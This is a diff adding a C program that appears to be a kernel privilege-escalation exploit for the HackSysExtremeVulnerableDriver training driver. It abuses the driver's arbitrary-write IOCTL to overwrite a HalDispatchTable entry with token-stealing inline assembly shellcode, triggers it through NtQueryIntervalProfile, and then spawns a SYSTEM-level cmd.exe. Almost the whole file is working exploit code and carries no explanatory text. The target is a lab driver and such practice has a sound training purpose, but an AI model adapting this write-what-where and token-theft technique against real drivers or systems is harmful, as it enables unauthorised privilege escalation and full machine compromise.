@@ -1,0 +1,97 @@
+#include <windows.h>
+#include <stdio.h>
+#include <Psapi.h>
+#include <profileapi.h>
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+HANDLE hDriver;
+DWORD dw;
+typedef NTSTATUS(WINAPI* NtQueryIntervalProfile)(
+	IN ULONG ProfileSource,
+	OUT PULONG Interval
+	);
+typedef NTSTATUS
+(NTAPI* _NtAllocateVirtualMemory)(
+	IN HANDLE               ProcessHandle,
+	IN OUT PVOID* BaseAddress,
+	IN ULONG                ZeroBits,
+	IN OUT PULONG           RegionSize,
+	IN ULONG                AllocationType,
+	IN ULONG                Protect);
+_NtAllocateVirtualMemory NtAllocateVirtualMemory;
+VOID ShellCode()
+{
+	__asm
+	{
+		//int 3
+		pop    edi
+		pop    esi
+		pop    ebx
+		pushad
+		mov eax, fs: [124h]
+		mov eax, [eax + 050h]
+		mov ecx, eax
+		mov edx, 4
+
+		findpid :
+		mov eax, [eax + 0b8h]
+		sub eax, 0b8h
+		cmp[eax + 0b4h], edx
+		jnz findpid
+
+		mov edx, [eax + 0f8h]
+		mov[ecx + 0f8h], edx
+		popad
+		ret
+	}
+}
+int main() {
+	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE hDevice;
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		getchar();
+		return -1;
+	}
+	LPVOID lpImageBase[1024]{};
+	DWORD lpcbNeeded{};
+	TCHAR lpfileName[1024]{};
+	PVOID UserBase ;
+	//Retrieves the load address for each device driver in the system
+	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
+
+	//Retrieves the base name of the specified device driver
+	GetDeviceDriverBaseName(lpImageBase[0], lpfileName, 48);
+	UserBase = lpImageBase[0];
+
+	HMODULE nbase = LoadLibraryA("ntkrnlpa.exe");
+	printf("UserBase=%x\n", UserBase);
+	printf("nbase=%x\n", nbase);
+	DWORD Interval = 0;
+	PVOID HalDispatchTable = GetProcAddress(nbase, "HalDispatchTable");
+	printf("HalDispatchTable=%x\n", HalDispatchTable);
+	HalDispatchTable = (PVOID)((ULONG)HalDispatchTable + (ULONG)UserBase - (ULONG)nbase);
+	printf("%x\n", HalDispatchTable);
+	ULONG buf[2];
+	buf[1] = (ULONG)HalDispatchTable + 4;
+	ULONG temp= (ULONG)&ShellCode;
+	buf[0] = (ULONG)&temp;
+	DeviceIoControl(hDriver, 0x22200b, buf, 8, 0, 0, &dw, NULL);
+	NtQueryIntervalProfile FNtQueryIntervalProfile = (NtQueryIntervalProfile)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
+	int NtStatus = FNtQueryIntervalProfile(
+		2, // Source
+		&Interval);// Interval
+	if (NtStatus)
+	{
+		printf("NtQueryIntervalProfile failed! NtStatus=%.8X\n", NtStatus);
+		getchar();
+		return -1;
+	}
+
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	return 0;
+}
